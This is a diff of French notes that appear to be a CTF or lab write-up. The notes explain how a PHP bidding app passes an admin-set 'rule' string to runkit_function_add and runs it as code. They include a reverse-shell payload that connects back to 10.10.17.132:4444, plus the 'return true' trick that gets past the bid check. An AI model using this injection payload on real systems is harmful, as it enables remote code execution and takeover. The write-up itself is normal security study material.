@@ -62,7 +62,39 @@ MySQL est dans un état **impossible** :
 Le parseur **attend encore du SQL**
 
 
+Bidding appel ça quand on fait place bidding:
+![[IMG-20251214144151236.png]]
+Dans includes/bid_handler.php on retrouve:
+![[IMG-20251214144313253.png]]
+Voici la doc de cette fonction:
+![[IMG-20251214144122497.png]]
+Ce que fait EXACTEMENT `runkit_function_add`:
+La signature est :
+```php
+runkit_function_add(
+    string $function_name,
+    string $argument_list,
+    string $code
+);
 ```
+PHP **crée dynamiquement une fonction** nommée `ruleCheck`  
+avec exactement ces arguments  
+et dont **le corps est la chaîne contenue dans `$rule`**
+Puis la fonction est ensuite appelé:
+```php
+$allowed = ruleCheck($current_bid, $previous_bid, $bidder);
+```
+Donc on peut mettre une payload dans rule à partir de la page admin:
+```php
 system("bash -c 'bash -i >& /dev/tcp/10.10.17.132/4444 0>&1'"); return true;
 ```
 
+return true; est important car dans le code après on vérifie:
+```php
+if (!$allowed) {
+    echo json_encode(['success' => false, 'message' => $rule_message]);
+    exit;
+}
+```
+
+![[IMG-20251214150054379.png]]
